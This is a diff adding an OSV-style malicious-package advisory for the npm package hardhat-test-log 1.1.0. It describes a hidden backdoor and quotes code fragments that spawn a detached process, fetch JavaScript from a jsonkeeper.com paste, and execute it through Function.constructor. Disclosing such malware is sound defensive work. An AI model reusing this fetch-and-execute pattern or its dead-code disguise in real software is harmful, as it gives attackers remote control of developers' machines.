@@ -1,0 +1,90 @@
+{
+  "modified": "2026-06-24T04:13:05Z",
+  "published": "2026-06-24T04:13:05Z",
+  "schema_version": "1.7.4",
+  "id": "MAL-2026-6369",
+  "summary": "Malicious code in hardhat-test-log (npm)",
+  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (c8eaf29821b0a2792ecc08837bdd52a09bee062279d6c8c83f5f15855b1098f6)\nPackage impersonates the legitimate hardhat-gas-reporter / eth-gas-reporter (README is a near-verbatim copy referencing eth-gas-reporter, but package.json name is hardhat-test-log). The exported reporter function in index.js sets `var opt = 1` and unconditionally takes the `else` branch, making the plausible Mocha-reporter implementation in the `if (!opt)` block dead code that exists only as cover. The reachable branch calls `utils.connectNet(...)` in lib/utils.js, which uses `child_process.spawn('node', [lib/syncResolve.js,...], { detached: true, stdio: ['ignore'] })` followed by `progs.unref()` to launch a detached, output-suppressed background process that survives the parent test runner. lib/syncResolve.js then performs `axios.get('https://www.jsonkeeper.com/b/NB36A', { headers: { 'x-secret-key': '_' } })`, reads `data.Cookie` from the response, and executes it via `new Function.constructor('require', result)(require)` — full remote code execution in the developer's Node process with access to `require`. jsonkeeper.com is an anonymous free JSON paste host whose content the author can mutate at any time, so any developer who installs this package and runs their Hardhat/Mocha test suite using this reporter will execute whatever JavaScript the author chooses to host there.\n",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "hardhat-test-log"
+      },
+      "versions": [
+        "1.1.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "indicators": {
+          "evidence_files": [
+            {
+              "path": "lib/syncResolve.js",
+              "sha256": "44002399a2427b6245b7aba983e270b3dade9e1c7e0d669807dfaaa78cb3ebbc",
+              "tlsh": "14017b9e3469e02c0eb012e9af175032f6126f27310ba1e9769d9b521f7ac695502eec"
+            },
+            {
+              "path": "lib/utils.js",
+              "sha256": "36c4c472f4d5f3409e527ffb69b413a6ef81c853ed6a4b82bc1ac32d19dbf371",
+              "tlsh": "250231961cf760d3112a35e8aa1b6011e568b65b3208daf5bead53443f0633cd0e7ae9"
+            },
+            {
+              "path": "index.js",
+              "sha256": "db6f048ab50bdad5c12883185a63f731a1ff1f9d98055ea63e34e9d28137415f",
+              "tlsh": "b3f1fe322eb7153745e3faac9bcba061d12696372201cfad7a8c93104f5447894efbe4"
+            },
+            {
+              "path": "README.md",
+              "sha256": "0ae78997fb4e33b7f2a18353ddeda8f65e274e766310e6dfe803cd91fb8bf26b",
+              "tlsh": "b362e8f33e0a4a620f7be7c4550db5a4ff2a915cd6976a95b4ae834c23062b241ef190"
+            }
+          ],
+          "package_integrity": [
+            {
+              "filename": "hardhat-test-log-1.1.0.tgz",
+              "hashes": {
+                "sha1": "b4ce708860e4f50e9de722399683656770515e36",
+                "sha512_sri": "sha512-YLkLCn9I3nIVSFFgBoXj4LMJl9WCwc5K0uTiRvo4Y2z03fYwWmIGF7hyC9ypZvdeE0yFzFiGs8frLzqSi+jLMA=="
+              }
+            }
+          ]
+        }
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/hardhat-test-log/v/1.1.0"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Amazon Inspector",
+      "type": "FINDER",
+      "contact": [
+        "inspector-research@amazon.com"
+      ]
+    }
+  ],
+  "database_specific": {
+    "malicious-packages-origins": [
+      {
+        "id": "IN-MAL-2026-007420",
+        "import_time": "2026-06-24T04:54:34.025624165Z",
+        "modified_time": "2026-06-24T04:13:05Z",
+        "sha256": "c8eaf29821b0a2792ecc08837bdd52a09bee062279d6c8c83f5f15855b1098f6",
+        "source": "amazon-inspector",
+        "versions": [
+          "1.1.0"
+        ]
+      }
+    ]
+  }
+}
